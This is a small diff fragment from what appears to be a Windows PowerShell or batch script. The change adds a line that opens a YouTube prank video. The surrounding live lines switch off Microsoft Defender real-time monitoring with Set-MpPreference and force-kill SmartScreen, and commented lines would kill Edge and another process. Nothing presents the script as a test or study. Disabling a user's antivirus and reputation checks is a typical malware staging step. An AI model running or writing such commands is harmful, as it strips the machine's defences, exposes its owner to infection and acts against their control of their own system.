@@ -3,6 +3,8 @@
 # taskkill /IM msedge.exe /F
 # taskkill /IM Batch.exe /F
 
+explorer https://www.youtube.com/watch?v=dQw4w9WgXcQ
+
 Set-MpPreference -DisableRealtimeMonitoring $true
 taskkill /IM smartscreen.exe /F
 
